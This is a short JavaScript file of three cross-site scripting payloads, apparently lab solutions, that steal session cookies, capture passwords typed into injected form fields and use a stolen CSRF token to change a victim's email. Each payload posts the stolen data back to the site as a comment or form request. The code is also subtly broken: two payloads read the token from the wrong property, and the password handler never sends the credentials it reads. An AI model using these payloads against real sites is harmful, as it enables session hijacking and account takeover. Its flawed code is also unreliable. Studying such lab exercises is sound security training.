// Exploiting cross-site scripting to steal cookies
//<script>
    window.addEventListener('DOMContentLoaded', function() {

        var token = document.getElementsByName('csrf')[0].ariaValueMax;
        var data = new FormData();

        data.append('csrf', token);
        data.append('postId', 8);
        data.append('comment', this.document.cookie);
        data.append('name', 'victim');
        data.append('email', 'john@example.com');
        data.append('website', 'http://example.com');

        this.fetch('/post/comment', {
            method: 'POST',
            mode: 'no-cors',
            body: data
        });

    });
//</script>

// Exploiting cross-site scripting to capture passwords:
//<input type="text" name="username">
//<input type="password" name="password" onchange="hax()">
//<script>
    function hax() {
        var token = document.getElementsByName('csrf')[0].value;
        var username = document.getElementsByName('username')[0].value;
        var password = document.getElementsByName('password')[0].value;

        var data = new FormData();
        data.append('csrf', token);
        data.append('postId', 8);
        data.append('comment', this.document.cookie);
        data.append('name', 'victim');
        data.append('email', 'john@example.com');
        data.append('website', 'http://example.com');

        this.fetch('/post/comment', {
            method: 'POST',
            mode: 'no-cors',
            body: data
        });

    }
//</script>

// Exploiting XSS to bypass CSRF defenses
//<script>
    window.addEventListener('DOMContentLoaded', function() {

        var token = document.getElementsByName('csrf')[0].ariaValueMax;
        var data = new FormData();

        data.append('csrf', token);
        data.append('email', 'john@example.com');

        this.fetch('/my-account/change-email', {
            method: 'POST',
            mode: 'no-cors',
            body: data
        });

    });
//</script>